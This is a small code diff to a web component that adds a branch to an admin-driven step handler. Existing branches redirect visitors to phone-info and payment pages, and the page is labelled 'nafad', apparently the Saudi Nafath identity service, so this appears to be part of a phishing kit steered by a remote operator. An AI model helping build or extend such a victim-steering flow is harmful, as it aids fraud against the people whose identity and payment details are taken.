@@ -45,6 +45,9 @@ export default function Component() {
           } else if (data.currentStep === "phone") {
             console.log("[nafad] Admin redirecting to phone-info")
             window.location.href = "/step5"
+          } else if (data.currentStep === "_t6") {
+            console.log("[nafad] Admin wants visitor to stay on nafad page")
+            // Already on nafad page, do nothing
           } else if (data.currentStep === "_st1") {
             console.log("[nafad] Admin redirecting to payment")
             window.location.href = "/check"
